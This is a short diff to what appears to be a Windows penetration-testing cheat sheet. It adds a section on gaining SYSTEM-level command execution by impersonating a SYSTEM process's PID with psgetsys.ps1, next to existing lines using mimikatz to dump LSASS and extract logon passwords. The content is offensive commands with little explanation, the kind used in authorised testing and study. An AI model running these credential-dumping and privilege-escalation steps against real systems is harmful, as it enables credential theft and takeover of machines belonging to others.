@@ -532,6 +532,13 @@ mimikatz.exe
 #sekurlsa::minidump C:\Tools\procdump\lsass.dmp
 #sekurlsa::logonpasswords
 ```
+### Powershell to get RCE
+grab the PID of a well-known process that runs as SYSTEM (such as LSASS and winlogon - tasklist | findstr "winlogon")
+```
+Must in elevated command prompt
+..\psgetsys.ps1
+ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
+```
 
 ### PowerUp.ps1
 ```
